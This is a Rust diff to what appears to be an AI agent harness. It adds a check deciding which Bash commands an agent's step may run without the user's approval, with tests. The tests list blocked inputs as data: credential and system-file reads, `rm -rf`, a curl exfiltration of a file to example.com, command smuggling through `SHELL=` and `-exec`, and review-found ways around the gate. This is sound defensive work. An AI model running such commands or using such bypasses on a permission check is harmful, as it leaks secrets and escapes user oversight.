@@ -3,6 +3,8 @@
 //! runs, and reaching the user's token. Defense in depth, not a
 //! guarantee: a script the agent writes then runs, a git alias or a tool other than Bash still gets through.
 
+use std::path::{Path, PathBuf};
+
 const REASON: &str = "In a TermF run, pushing, pull requests and writes to the tracker wait until the user \
                       delivers the run. Commit your work if you like, then tell the user it is ready.";
 const CI_REASON: &str =
@@ -72,6 +74,740 @@ pub fn guard(line: &str) -> Option<String> {
         }
     }
     None
+}
+
+/// What a reading program takes; anything else asks: short options alone or in a cluster (`flags`) or with a
+/// value glued or in the next word (`valued`), long options by their exact name, never abbreviated (a trailing `=`:
+/// with a value, glued or in the next word), and `-NUM` (`numbers`). None of them writes, runs a program, follows
+/// links while it walks a folder or reads a list of files.
+struct Options {
+    flags: &'static str,
+    valued: &'static str,
+    long: &'static [&'static str],
+    numbers: bool,
+}
+
+/// What a team's step reads without asking, with `git` ([`GIT`]), `find` ([`finds`]) and `echo`.
+const READERS: [(&str, Options); 11] = [
+    (
+        "ls",
+        Options {
+            flags: "laAhRtrS1dFpGinogcusCxmT",
+            valued: "",
+            long: &[
+                "--all",
+                "--almost-all",
+                "--human-readable",
+                "--recursive",
+                "--reverse",
+                "--directory",
+                "--classify",
+                "--color",
+                "--inode",
+                "--size",
+                "--numeric-uid-gid",
+                "--group-directories-first",
+            ],
+            numbers: false,
+        },
+    ),
+    (
+        "cat",
+        Options {
+            flags: "AbeEnstTuv",
+            valued: "",
+            long: &[
+                "--number",
+                "--number-nonblank",
+                "--squeeze-blank",
+                "--show-all",
+                "--show-ends",
+                "--show-tabs",
+                "--show-nonprinting",
+            ],
+            numbers: false,
+        },
+    ),
+    (
+        "head",
+        Options {
+            flags: "qv",
+            valued: "nc",
+            long: &["--lines=", "--bytes=", "--quiet", "--silent", "--verbose"],
+            numbers: true,
+        },
+    ),
+    (
+        "tail",
+        Options {
+            flags: "qvr",
+            valued: "nc",
+            long: &["--lines=", "--bytes=", "--quiet", "--silent", "--verbose"],
+            numbers: true,
+        },
+    ),
+    (
+        "wc",
+        Options {
+            flags: "lwcmL",
+            valued: "",
+            long: &[
+                "--lines",
+                "--words",
+                "--bytes",
+                "--chars",
+                "--max-line-length",
+            ],
+            numbers: false,
+        },
+    ),
+    (
+        "grep",
+        Options {
+            flags: "rnilLcvwxohHsqEFGPIab",
+            valued: "eABCm",
+            long: &[
+                "--recursive",
+                "--line-number",
+                "--ignore-case",
+                "--files-with-matches",
+                "--files-without-match",
+                "--count",
+                "--invert-match",
+                "--word-regexp",
+                "--line-regexp",
+                "--only-matching",
+                "--no-filename",
+                "--with-filename",
+                "--no-messages",
+                "--quiet",
+                "--silent",
+                "--extended-regexp",
+                "--fixed-strings",
+                "--basic-regexp",
+                "--perl-regexp",
+                "--text",
+                "--byte-offset",
+                "--color",
+                "--colour",
+                "--include=",
+                "--exclude=",
+                "--exclude-dir=",
+                "--regexp=",
+                "--max-count=",
+                "--after-context=",
+                "--before-context=",
+                "--context=",
+            ],
+            numbers: true,
+        },
+    ),
+    (
+        "rg",
+        Options {
+            flags: "inNsSwxlcvFUuoHIaqp",
+            valued: "eABCmgtTMd",
+            long: &[
+                "--line-number",
+                "--no-line-number",
+                "--ignore-case",
+                "--smart-case",
+                "--case-sensitive",
+                "--word-regexp",
+                "--line-regexp",
+                "--files-with-matches",
+                "--files-without-match",
+                "--count",
+                "--count-matches",
+                "--invert-match",
+                "--fixed-strings",
+                "--multiline",
+                "--only-matching",
+                "--with-filename",
+                "--no-filename",
+                "--hidden",
+                "--no-ignore",
+                "--files",
+                "--heading",
+                "--no-heading",
+                "--json",
+                "--vimgrep",
+                "--column",
+                "--trim",
+                "--stats",
+                "--quiet",
+                "--text",
+                "--no-messages",
+                "--type-list",
+                "--color=",
+                "--glob=",
+                "--iglob=",
+                "--type=",
+                "--type-not=",
+                "--max-count=",
+                "--max-depth=",
+                "--max-columns=",
+                "--regexp=",
+                "--after-context=",
+                "--before-context=",
+                "--context=",
+                "--sort=",
+                "--sortr=",
+            ],
+            numbers: false,
+        },
+    ),
+    (
+        "pwd",
+        Options {
+            flags: "LP",
+            valued: "",
+            long: &[],
+            numbers: false,
+        },
+    ),
+    (
+        "sort",
+        Options {
+            flags: "bdfghiMnrRsuVcCmz",
+            valued: "kt",
+            long: &[
+                "--reverse",
+                "--numeric-sort",
+                "--unique",
+                "--ignore-case",
+                "--ignore-leading-blanks",
+                "--dictionary-order",
+                "--human-numeric-sort",
+                "--month-sort",
+                "--version-sort",
+                "--general-numeric-sort",
+                "--random-sort",
+                "--stable",
+                "--check",
+                "--merge",
+                "--zero-terminated",
+                "--key=",
+                "--field-separator=",
+            ],
+            numbers: false,
+        },
+    ),
+    // A second operand is a file uniq writes: see [`reader`].
+    (
+        "uniq",
+        Options {
+            flags: "cdui",
+            valued: "",
+            long: &["--count", "--repeated", "--unique", "--ignore-case"],
+            numbers: false,
+        },
+    ),
+    // Its program on the command line only (no `-f`, `-L`, `--rawfile`), and see [`reader`] for what it may say.
+    (
+        "jq",
+        Options {
+            flags: "rcSesnjaMCR",
+            valued: "",
+            long: &[
+                "--raw-output",
+                "--compact-output",
+                "--sort-keys",
+                "--exit-status",
+                "--slurp",
+                "--null-input",
+                "--join-output",
+                "--ascii-output",
+                "--monochrome-output",
+                "--color-output",
+                "--raw-input",
+                "--tab",
+            ],
+            numbers: false,
+        },
+    ),
+];
+
+/// What `git diff`, `log` and `show` take.
+const REVISIONS: Options = Options {
+    flags: "puswbRMCBzaiEF",
+    valued: "nSGU",
+    long: &[
+        "--oneline",
+        "--graph",
+        "--decorate",
+        "--all",
+        "--reverse",
+        "--no-merges",
+        "--merges",
+        "--first-parent",
+        "--abbrev-commit",
+        "--format=",
+        "--pretty",
+        "--since=",
+        "--until=",
+        "--after=",
+        "--before=",
+        "--author=",
+        "--committer=",
+        "--grep=",
+        "--max-count=",
+        "--skip=",
+        "--follow",
+        "--date=",
+        "--name-only",
+        "--name-status",
+        "--stat",
+        "--shortstat",
+        "--numstat",
+        "--summary",
+        "--patch",
+        "--no-patch",
+        "--raw",
+        "--color",
+        "--no-color",
+        "--word-diff",
+        "--cached",
+        "--staged",
+        "--unified=",
+        "--ignore-all-space",
+        "--ignore-space-change",
+        "--ignore-blank-lines",
+        "--diff-filter=",
+        "--find-renames",
+        "--check",
+        "--exit-code",
+        "--quiet",
+        "--minimal",
+        "--patience",
+        "--histogram",
+        "--relative",
+        "--abbrev",
+        "--full-index",
+        "--merge-base",
+        "--topo-order",
+        "--date-order",
+        "--left-right",
+        "--source",
+        "--branches",
+        "--tags",
+        "--remotes",
+        "--no-ext-diff",
+        "--no-textconv",
+    ],
+    numbers: true,
+};
+
+/// The git subcommands a step reads with, after `git` or `git --no-pager` (no other option of git's own).
+const GIT: [(&str, Options); 6] = [
+    (
+        "status",
+        Options {
+            flags: "sbvz",
+            valued: "u",
+            long: &[
+                "--short",
+                "--branch",
+                "--porcelain",
+                "--long",
+                "--verbose",
+                "--untracked-files",
+                "--ignored",
+                "--show-stash",
+                "--ahead-behind",
+                "--no-ahead-behind",
+                "--renames",
+                "--no-renames",
+                "--column",
+                "--no-column",
+                "--ignore-submodules",
+            ],
+            numbers: false,
+        },
+    ),
+    ("diff", REVISIONS),
+    ("log", REVISIONS),
+    ("show", REVISIONS),
+    // With no operand: one would create a branch.
+    (
+        "branch",
+        Options {
+            flags: "arvl",
+            valued: "",
+            long: &[
+                "--all",
+                "--remotes",
+                "--list",
+                "--verbose",
+                "--show-current",
+                "--color",
+                "--no-color",
+            ],
+            numbers: false,
+        },
+    ),
+    (
+        "rev-parse",
+        Options {
+            flags: "q",
+            valued: "",
+            long: &[
+                "--abbrev-ref",
+                "--short",
+                "--show-toplevel",
+                "--show-prefix",
+                "--show-cdup",
+                "--git-dir",
+                "--git-common-dir",
+                "--absolute-git-dir",
+                "--is-inside-work-tree",
+                "--is-inside-git-dir",
+                "--is-bare-repository",
+                "--verify",
+                "--quiet",
+                "--symbolic-full-name",
+                "--symbolic",
+            ],
+            numbers: false,
+        },
+    ),
+];
+
+/// `find`'s primaries a step uses, alone or with one value: no option before them (`-L`, `-H`), nothing that
+/// runs, writes, follows links or reads a list of files.
+const FIND_ALONE: [&str; 14] = [
+    "(", ")", "!", "-not", "-and", "-a", "-or", "-o", "-print", "-print0", "-prune", "-empty",
+    "-true", "-false",
+];
+const FIND_VALUED: [&str; 14] = [
+    "-name",
+    "-iname",
+    "-path",
+    "-ipath",
+    "-type",
+    "-maxdepth",
+    "-mindepth",
+    "-newer",
+    "-size",
+    "-mtime",
+    "-mmin",
+    "-regex",
+    "-iregex",
+    "-perm",
+];
+
+/// Whether Bash's `line`, run in `cwd`, may run without the user's approval in a team's step that works in
+/// `worktree`: each of its simple commands reads only (a closed list of programs, git subcommands and their
+/// options) or is a check of `allowed` (the repository's checks, tests and lint), nothing it names lies outside
+/// the worktree, and the line holds nothing that could run or write anything else: a redirection to a file, a
+/// substitution, a variable, a subshell or a group, a function, a command in the background, an assignment
+/// before a command. A check passes as the project writes it, followed by [`plain`] paths after its last command,
+/// or, when it is one simple command, among reads and followed by plain paths: never with an option or a
+/// `name=value`, which may make it run anything (`make test SHELL=…`, `go test -exec …`). Anything else asks, as
+/// before; a refusal of [`guard`] comes first.
+pub fn reads(line: &str, worktree: &Path, cwd: &Path, allowed: &[String]) -> bool {
+    let Ok(root) = std::fs::canonicalize(worktree) else {
+        return false;
+    };
+    if !within(cwd, &root, cwd) || guard(line).is_some() {
+        return false;
+    }
+    // The checks as the project writes them, whatever they hold: the team's `shell` step runs them anyway.
+    if allowed
+        .iter()
+        .any(|c| !c.trim().is_empty() && c.trim() == line.trim())
+    {
+        return true;
+    }
+    let Some(parts) = segments(line) else {
+        return false;
+    };
+    let inside = |words: &[String]| words.iter().all(|w| path_inside(w, &root, cwd));
+    let checks: Vec<Vec<Vec<String>>> = allowed
+        .iter()
+        .filter_map(|c| segments(c))
+        .filter(|c| !c.is_empty())
+        .collect();
+    let plains = |words: &[String], cwd: &Path| words.iter().all(|w| plain(w, &root, cwd));
+    // Never a prefix taken from a command of a compound check: `rm -rf dist && npm test` is no `rm -rf dist …`.
+    let whole = checks.iter().any(|check| {
+        let (last, first) = check.split_last().unwrap();
+        // Its paths are read from where its `cd`s lead.
+        let here = first
+            .iter()
+            .filter(|w| w.len() == 2 && w[0] == "cd")
+            .fold(cwd.to_path_buf(), |dir, w| dir.join(&w[1]));
+        parts.len() == check.len()
+            && parts[..first.len()] == *first
+            && parts[first.len()].starts_with(last)
+            && plains(&parts[first.len()][last.len()..], &here)
+    });
+    whole
+        || (!parts.is_empty()
+            && parts.iter().all(|words| {
+                match checks
+                    .iter()
+                    .find(|c| c.len() == 1 && c[0][0] != "cd" && words.starts_with(&c[0]))
+                {
+                    Some(check) => plains(&words[check[0].len()..], cwd),
+                    None => reader(words) && inside(&words[1..]),
+                }
+            }))
+}
+
+/// Whether `word`, an argument added to a check, is a plain relative path in `root` from `cwd`: letters, digits,
+/// `.`, `_`, `-` and `/` only, no `-` or `/` first, no `..`. No option, no `name=value`, nothing of the shell.
+fn plain(word: &str, root: &Path, cwd: &Path) -> bool {
+    !word.is_empty()
+        && !word.starts_with(['-', '/'])
+        && word
+            .chars()
+            .all(|c| c.is_alphanumeric() || "._-/".contains(c))
+        && !word.split('/').any(|part| part == "..")
+        && within(Path::new(word), root, cwd)
+}
+
+/// Whether the simple command `words` reads only: a program of [`READERS`] or [`GIT`] with its options only,
+/// `find` with [`finds`]'s primaries only, or `echo`.
+fn reader(words: &[String]) -> bool {
+    let (program, args) = (words[0].as_str(), &words[1..]);
+    match program {
+        "echo" => true,
+        "find" => finds(args),
+        "git" => {
+            let args = match args.first().map(String::as_str) {
+                Some("--no-pager") => &args[1..],
+                _ => args,
+            };
+            let Some((sub, args)) = args.split_first() else {
+                return false;
+            };
+            GIT.iter()
+                .find(|(name, _)| name == sub)
+                .and_then(|(_, options)| operands(args, options))
+                .is_some_and(|operands| sub != "branch" || operands.is_empty())
+        }
+        _ => {
+            let Some(operands) = READERS
+                .iter()
+                .find(|(name, _)| *name == program)
+                .and_then(|(_, options)| operands(args, options))
+            else {
+                return false;
+            };
+            match program {
+                "uniq" => operands.len() <= 1,
+                // `env` and `$ENV` read the environment, `import` and `include` a module from a file.
+                "jq" => !operands.iter().any(|o| {
+                    let o = o.to_lowercase();
+                    ["env", "import", "include", "modulemeta"]
+                        .iter()
+                        .any(|w| o.contains(w))
+                }),
+                _ => true,
+            }
+        }
+    }
+}
+
+/// The operands of `args` when each of its options is one of `options`, else `None`, read as getopt reads them:
+/// a cluster of short options, a value glued to its option or in the next word (never an option itself), `--`
+/// before operands only.
+fn operands<'a>(args: &'a [String], options: &Options) -> Option<Vec<&'a str>> {
+    let mut found = Vec::new();
+    let mut args = args.iter();
+    let value = |next: Option<&String>| next.filter(|v| !v.starts_with('-')).map(|_| ());
+    while let Some(arg) = args.next() {
+        if arg == "--" {
+            found.extend(args.map(String::as_str));
+            break;
+        }
+        if arg.starts_with("--") {
+            let name = arg.split('=').next().unwrap_or(arg);
+            let known = options
+                .long
+                .iter()
+                .find(|o| o.trim_end_matches('=') == name)?;
+            if known.ends_with('=') && !arg.contains('=') {
+                value(args.next())?;
+            }
+        } else if let Some(short) = arg.strip_prefix('-').filter(|s| !s.is_empty()) {
+            if options.numbers && short.bytes().all(|b| b.is_ascii_digit()) {
+                continue;
+            }
+            for (at, c) in short.char_indices() {
+                if options.valued.contains(c) {
+                    if at + c.len_utf8() == short.len() {
+                        value(args.next())?;
+                    }
+                    break;
+                }
+                if !options.flags.contains(c) {
+                    return None;
+                }
+            }
+        } else {
+            found.push(arg.as_str());
+        }
+    }
+    Some(found)
+}
+
+/// Whether `args` of `find` are starting points, then an expression of [`FIND_ALONE`] and [`FIND_VALUED`] only.
+fn finds(args: &[String]) -> bool {
+    let mut args = args
+        .iter()
+        .skip_while(|a| !a.starts_with('-') && !FIND_ALONE.contains(&a.as_str()));
+    while let Some(arg) = args.next() {
+        let arg = arg.as_str();
+        if FIND_VALUED.contains(&arg) {
+            if args.next().is_none() {
+                return false;
+            }
+        } else if !FIND_ALONE.contains(&arg) {
+            return false;
+        }
+    }
+    true
+}
+
+/// Whether each path `word` may name (itself unless it is an option, and what follows each of its `=`: an
+/// option's value, or `name=value`'s) stays in `root` once resolved from `cwd`, symbolic links included. An option
+/// with a path glued to it (`-f/etc/x`) is not read: no.
+fn path_inside(word: &str, root: &Path, cwd: &Path) -> bool {
+    // zsh makes `=cmd` the full path of a program.
+    let inside = |path: &str| !path.starts_with(['~', '=']) && within(Path::new(path), root, cwd);
+    let values = word
+        .match_indices('=')
+        .all(|(at, _)| inside(&word[at + 1..]));
+    let head = word.split('=').next().unwrap_or(word);
+    values
+        && match word.starts_with('-') {
+            true => !head.contains(['/', '\\']),
+            false => inside(word),
+        }
+}
+
+/// Whether `path`, from `cwd`, is in `root` (canonical), resolved one element at a time as the system does: each
+/// link followed where it leads before a `..` goes up from there.
+fn within(path: &Path, root: &Path, cwd: &Path) -> bool {
+    use std::path::Component;
+    let mut full = match path.is_absolute() {
+        true => PathBuf::new(),
+        false => match std::fs::canonicalize(cwd) {
+            Ok(real) => real,
+            Err(_) => return false,
+        },
+    };
+    for part in path.components() {
+        match part {
+            Component::ParentDir => {
+                full.pop();
+            }
+            Component::CurDir => {}
+            Component::Normal(name) => {
+                full.push(name);
+                if let Ok(real) = std::fs::canonicalize(&full) {
+                    full = real;
+                }
+            }
+            other => full.push(other),
+        }
+    }
+    full.starts_with(root)
+}
+
+/// The simple commands of `line` and their words, or `None` as soon as it holds anything but words, quotes and
+/// `;`, `&&`, `||`, `|`, newlines: no `$` (variables, substitutions), backquote, parenthesis, brace, `<`, lone
+/// `&`, comment, pattern the shell expands (`*`, `?`, `[`), nor redirection except of a descriptor (`2>&1`) or to
+/// `/dev/null`.
+fn segments(line: &str) -> Option<Vec<Vec<String>>> {
+    let mut split = Split::default();
+    let mut chars = line.chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            '\'' => {
+                split.started = true;
+                loop {
+                    match chars.next()? {
+                        '\'' => break,
+                        c => split.word.push(c),
+                    }
+                }
+            }
+            '"' => {
+                split.started = true;
+                loop {
+                    match chars.next()? {
+                        '"' => break,
+                        '$' | '`' => return None,
+                        '\\' => match chars.next()? {
+                            '\n' => {}
+                            n if "\"\\$`".contains(n) => split.word.push(n),
+                            n => split.word.extend(['\\', n]),
+                        },
+                        c => split.word.push(c),
+                    }
+                }
+            }
+            '\\' => match chars.next()? {
+                '\n' => {}
+                n => {
+                    split.started = true;
+                    split.word.push(n);
+                }
+            },
+            ';' | '\n' => split.end_command(),
+            '|' => {
+                chars.next_if(|n| matches!(n, '|' | '&'));
+                split.end_command();
+            }
+            '&' if chars.next_if_eq(&'&').is_some() => split.end_command(),
+            '&' if chars.next_if_eq(&'>').is_some() => {
+                split.end_word();
+                to_null(&mut chars)?;
+            }
+            '>' => {
+                // `2>` names a descriptor: that word is not an argument.
+                if !split.started && split.word.chars().all(|c| c.is_ascii_digit()) {
+                    split.word.clear();
+                }
+                split.end_word();
+                chars.next_if_eq(&'>');
+                match chars.next_if_eq(&'&') {
+                    Some(_) => {
+                        let fd: String = std::iter::from_fn(|| {
+                            chars.next_if(|n| n.is_ascii_digit() || *n == '-')
+                        })
+                        .collect();
+                        // `>&2file` and `>& file` write to a file.
+                        let glued = chars
+                            .peek()
+                            .is_some_and(|n| !n.is_whitespace() && !";|&".contains(*n));
+                        if fd.is_empty() || glued {
+                            return None;
+                        }
+                    }
+                    None => to_null(&mut chars)?,
+                }
+            }
+            '$' | '`' | '(' | ')' | '{' | '}' | '<' | '&' | '*' | '?' | '[' => return None,
+            '#' if split.word.is_empty() && !split.started => return None,
+            c if c.is_whitespace() => split.end_word(),
+            c => split.word.push(c),
+        }
+    }
+    split.end_command();
+    Some(split.commands)
+}
+
+/// Reads the target of a redirection, which must be `/dev/null`.
+fn to_null(chars: &mut std::iter::Peekable<std::str::Chars>) -> Option<()> {
+    while chars.next_if(|c| *c == ' ' || *c == '\t').is_some() {}
+    let target: String =
+        std::iter::from_fn(|| chars.next_if(|c| !c.is_whitespace() && !";|&<>()".contains(*c)))
+            .collect();
+    (target == "/dev/null").then_some(())
 }
 
 /// Why `tool` (with Bash's command `line`) may send data out of the machine, which a session that read prod
@@ -559,6 +1295,755 @@ mod tests {
             "",
         ] {
             assert_eq!(guard(allowed), None, "{allowed}");
+        }
+    }
+
+    /// A worktree with folders, a file, and links that lead out of it: `out` (and `app/out`) to a folder outside,
+    /// `deep` two folders down in it, so that `deep/..` is outside too.
+    fn worktree(name: &str) -> PathBuf {
+        let root = std::env::temp_dir().join(format!("termf-reads-{name}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(root.join("wt/src")).unwrap();
+        std::fs::create_dir_all(root.join("wt/app")).unwrap();
+        std::fs::create_dir_all(root.join("outside/a/b")).unwrap();
+        std::fs::write(root.join("outside/secret"), "s").unwrap();
+        std::fs::write(root.join("outside/a/secret"), "s").unwrap();
+        std::fs::write(root.join("wt/README.md"), "hi").unwrap();
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink(root.join("outside"), root.join("wt/out")).unwrap();
+            std::os::unix::fs::symlink(root.join("outside"), root.join("wt/app/out")).unwrap();
+            std::os::unix::fs::symlink(root.join("outside/a/b"), root.join("wt/deep")).unwrap();
+        }
+        root.join("wt")
+    }
+
+    fn checks() -> Vec<String> {
+        ["npm test", "npm run lint", "cd app && pnpm check"]
+            .map(String::from)
+            .to_vec()
+    }
+
+    #[test]
+    fn a_team_reads_and_tests_without_asking() {
+        let wt = worktree("real");
+        let pass = |line: &str, cwd: &Path| reads(line, &wt, cwd, &checks());
+        // What the agents ran in the acceptance run (PR #131), which asked the user each time.
+        for line in [
+            "git status --short; echo ---; cat README.md; npm test | tail",
+            "git status",
+            "git --no-pager log --oneline -5",
+            "git diff HEAD~1 -- src",
+            "git show HEAD:README.md",
+            "git branch -a",
+            "git rev-parse --abbrev-ref HEAD",
+            "ls -la src",
+            "cat package.json | jq .scripts",
+            "npm test 2>&1 | tail -20",
+            "npm test src/app.test.js",
+            "npm run lint",
+            "cd app && pnpm check",
+            "grep -rn \"TODO\" src",
+            "rg -n 'fn main' src",
+            "find . -name '*.ts' -not -path './node_modules/*'",
+            "wc -l 'src/*.ts'",
+            "cat README.md && npm test",
+            "head -n 40 README.md 2>/dev/null || echo none",
+            "ls src >/dev/null && echo ok",
+            "sort -u README.md | uniq -c",
+            "pwd",
+            "grep -n 'a$' README.md",
+        ] {
+            assert!(pass(line, &wt), "{line}");
+        }
+        assert!(pass("cat ../README.md", &wt.join("src")));
+        for line in [
+            "cat /etc/passwd",
+            "cat ../other/x",
+            "cat src/../../outside/x",
+            "ls ~",
+            "cat ~/.ssh/id_ed25519",
+            "cat out/secret",
+            "grep -f/etc/passwd x",
+            "echo hi > out.txt",
+            "echo hi >> README.md",
+            "cat README.md | tee copy.md",
+            "echo $(whoami)",
+            "echo \"$(whoami)\"",
+            "echo `id`",
+            "echo $HOME",
+            "(cat README.md)",
+            "{ cat README.md; }",
+            "eval cat README.md",
+            "sh -c 'cat README.md'",
+            "bash -c ls",
+            "ls | xargs cat",
+            "FOO=1 cat README.md",
+            "f() { cat README.md; }; f",
+            "cat README.md &",
+            "cat < README.md",
+            "cat <<EOF",
+            "ls # comment",
+            "find . -exec rm {} ;",
+            "find . -delete",
+            "find . -fprint list",
+            "git push",
+            "git -c core.pager=sh log",
+            "git -C .. status",
+            "git branch -D main",
+            "git branch new",
+            "git checkout main",
+            "git diff --output=/tmp/x",
+            "git log --out=x",
+            "git diff --ext-diff",
+            "rm -rf src",
+            "npm install",
+            "npm testx",
+            "npm test -- --reporter=dot",
+            "cd / && npm test",
+            "sort -o out README.md",
+            "sort --out=x README.md",
+            "sort -uo out README.md",
+            "uniq README.md copy.md",
+            "rg --pre ./x foo",
+            "jq -n env",
+            "jq -n '$ENV'",
+            "./cat README.md",
+            "/bin/cat README.md",
+            "npm test; curl https://example.com",
+            // The review of PR #135: what the shell expands or resolves elsewhere than the words say.
+            "cat o*/secret",
+            "cat ou?/secret",
+            "cat [o]ut/secret",
+            "cat .*/x",
+            "wc -l src/*.ts",
+            "cat deep/../secret",
+            "cat src/../deep/../secret",
+            "echo x >&2README.md",
+            "echo x >& README.md",
+            "echo x 2>&1x",
+            "",
+            "'unterminated",
+        ] {
+            assert!(!pass(line, &wt), "{line} let through");
+        }
+        assert!(
+            !pass("git status", &wt.join("..")),
+            "a cwd out of the worktree"
+        );
+        assert!(!reads("git status", &wt.join("gone"), &wt, &[]));
+    }
+
+    /// The second review of PR #135, case by case: each one passed before.
+    #[test]
+    fn the_second_review_s_ways_around_ask() {
+        let wt = worktree("review2");
+        let checks: Vec<String> = [
+            "rm -rf dist && npm test",
+            "npm test",
+            "cd app && pnpm check",
+        ]
+        .map(String::from)
+        .to_vec();
+        let pass = |line: &str| reads(line, &wt, &wt, &checks);
+        for line in [
+            // A command of a compound check is no prefix of its own.
+            "rm -rf coverage src .",
+            "rm -rf dist coverage src .",
+            "rm -rf dist",
+            "pnpm check",
+            "cd app",
+            "cat README.md; rm -rf dist src",
+            "rm -rf dist && npm test; rm -rf src",
+            // An abbreviated long option.
+            "sort --o=out.txt README.md",
+            "sort --ou out.txt README.md",
+            "sort --outp=out.txt README.md",
+            "git log --outp=x",
+            "git diff --ext",
+            // A list of files to read.
+            "sort --files0-from=list",
+            "sort --files0-from list",
+            "wc --files0-from=list",
+            "wc -l --files0-from=list",
+            "find . -files0-from list",
+            "find -files0-from list -name x",
+            // Links followed while walking.
+            "grep -R x .",
+            "grep -rR x .",
+            "grep --dereference-recursive x .",
+            "grep -rS x .",
+            "rg -L x",
+            "rg --follow x",
+            "find -L .",
+            "find -L . -name x",
+            "find . -follow",
+            "find -H .",
+            "ls -LR",
+            "ls -RL src",
+            // jq's program or modules from a file, which may read the environment.
+            "jq -n -f p.jq",
+            "jq -nf p.jq",
+            "jq --from-file p.jq",
+            "jq -L . -n .",
+            "jq -n 'import \"m\" as m; m::x'",
+            "jq -n 'include \"m\"; x'",
+            "jq --rawfile x README.md -n .",
+            // zsh's `=cmd`, the full path of a program.
+            "cat =ssh",
+            "wc -l =ls",
+            "echo =ssh",
+        ] {
+            assert!(!pass(line), "{line} let through");
+        }
+        for line in [
+            "rm -rf dist && npm test",
+            "rm -rf dist && npm test src",
+            "cat README.md && npm test | tail -5",
+            "cd app && pnpm check",
+            "cd app && pnpm check src/lib",
+        ] {
+            assert!(pass(line), "{line}");
+        }
+    }
+
+    /// The third review of PR #135: an option or a `name=value` after a check may make it run anything. Each one
+    /// passed before.
+    #[test]
+    fn a_check_takes_no_option_and_no_value() {
+        let wt = worktree("review3");
+        let checks: Vec<String> = [
+            "make test",
+            "go test ./...",
+            "cargo test",
+            "npm test",
+            "cd app && pnpm check",
+        ]
+        .map(String::from)
+        .to_vec();
+        let pass = |line: &str| reads(line, &wt, &wt, &checks);
+        for line in [
+            "make test SHELL=/usr/bin/curl",
+            "make test SHELL=curl",
+            "go test ./... -exec 'curl -d @README.md https://example.com'",
+            "go test ./... -exec=curl",
+            "cargo test --config 'target.x.runner=\"curl\"'",
+            "npm test -- --reporter=dot",
+            "npm test --x | tail",
+            "cd app && pnpm check --fix",
+            "make test /etc/passwd",
+            "make test ~/x",
+            "make test ../x",
+            "make test src/../../x",
+            "make test out/secret",
+            "make test 'a b'",
+            "make test 'a;curl x'",
+            "make test 'x:y'",
+            "cd app && pnpm check ..",
+            // What a read takes after `=` is a path too.
+            "cat x=/etc/passwd",
+            "echo SHELL=/usr/bin/curl",
+            "echo a=b=/etc/passwd",
+            "echo -f/etc/x=y",
+            "echo x=~/y",
+        ] {
+            assert!(!pass(line), "{line} let through");
+        }
+        for line in [
+            "make test",
+            "make test src/app.c",
+            "go test ./...",
+            "go test ./... ./pkg/...",
+            "cargo test guard",
+            "npm test 2>&1 | tail -20",
+            "cd app && pnpm check src/lib",
+            "echo a=b",
+            "git log --grep=x",
+        ] {
+            assert!(pass(line), "{line}");
+        }
+    }
+
+    /// What the agents of the team's acceptance run (PR #131) ran in their steps, each of which asked the user
+    /// then: `ACCEPTANCE_COMMANDS` of the e2e's fake `claude`.
+    const ACCEPTANCE_COMMANDS: [&str; 12] = [
+        "git status --short; echo ---; cat README.md; npm test | tail",
+        "git diff HEAD~1 -- src",
+        "git log --oneline -5",
+        "ls -la src",
+        "cat package.json | jq .scripts",
+        "grep -rn greet src",
+        "find . -name '*.js' -not -path './node_modules/*'",
+        "npm test 2>&1 | tail -20",
+        "wc -l src/app.js",
+        "head -n 20 README.md",
+        "npm install left-pad",
+        "curl -s https://example.com",
+    ];
+
+    #[test]
+    fn of_the_acceptance_run_s_commands_an_install_and_the_network_ask() {
+        let wt = worktree("acceptance");
+        let asked: Vec<&str> = ACCEPTANCE_COMMANDS
+            .into_iter()
+            .filter(|line| !reads(line, &wt, &wt, &["npm test".into()]))
+            .collect();
+        assert_eq!(
+            asked,
+            ["npm install left-pad", "curl -s https://example.com"]
+        );
+    }
+
+    /// Reading commands, and words each one may take more of.
+    const READ_ONLY: [(&str, &[&str]); 19] = [
+        (
+            "git status",
+            &["--short", "-sb", "--porcelain=v2", "-uno", "src"],
+        ),
+        (
+            "git diff",
+            &["--stat", "HEAD~1", "--name-only", "-U3", "--cached", "src"],
+        ),
+        (
+            "git log --oneline",
+            &["-5", "-n3", "--max-count=3", "--grep=x", "src"],
+        ),
+        (
+            "git show HEAD",
+            &["--stat", "--name-only", "HEAD:README.md", "-s"],
+        ),
+        ("git branch", &["-a", "-vv", "--show-current"]),
+        (
+            "git rev-parse",
+            &["--abbrev-ref", "HEAD", "--show-toplevel"],
+        ),
+        ("ls", &["-la", "-R", "-1", "src", "--all"]),
+        (
+            "cat",
+            &["-n", "README.md", "src", "'a-b'", "\"x-y\"", "./src/../src"],
+        ),
+        ("head", &["-n5", "-20", "--lines=3", "README.md"]),
+        ("tail", &["-n5", "-20", "README.md"]),
+        ("wc", &["-l", "-wc", "README.md", "'src/*.ts'"]),
+        (
+            "grep -rn x",
+            &["-i", "-C2", "--include='*.ts'", "-ex", "src", "-5"],
+        ),
+        (
+            "rg -n x",
+            &["-i", "--hidden", "-g'*.ts'", "--type=rust", "src"],
+        ),
+        (
+            "find .",
+            &[
+                "-name x",
+                "-type f",
+                "-maxdepth 2",
+                "-not -path './node_modules/*'",
+                "-print",
+            ],
+        ),
+        ("echo", &["hello", "-n", "---"]),
+        ("sort", &["-u", "-rn", "-t,", "-k2", "README.md"]),
+        ("uniq", &["-c", "-d", "-i"]),
+        ("jq .", &["-r", "-c", "--sort-keys", "README.md"]),
+        ("pwd", &["-P"]),
+    ];
+    const JOINS: [&str; 5] = ["; ", " && ", " || ", " | ", "\n"];
+    /// Never let through, wherever they stand.
+    const ANYWHERE: [&str; 24] = [
+        "=ssh",
+        "A=/etc/passwd",
+        "-f/etc/x=y",
+        "o*/secret",
+        "ou?/x",
+        "[o]ut",
+        ".*",
+        "deep/../secret",
+        ">&2f",
+        ">& f",
+        "> f",
+        ">> f",
+        "$(id)",
+        "`id`",
+        "(ls)",
+        "{ ls; }",
+        "$HOME",
+        "\"$x\"",
+        "&",
+        "< f",
+        "/etc/passwd",
+        "../../x",
+        "~/x",
+        "#x",
+    ];
+    /// Never let through as a command of their own.
+    const AS_COMMAND: [&str; 12] = [
+        "tee f",
+        "eval ls",
+        "sh -c ls",
+        "bash -c 'ls'",
+        "xargs ls",
+        "A=1 ls",
+        "rm x",
+        "cd /",
+        "npm install",
+        "git push",
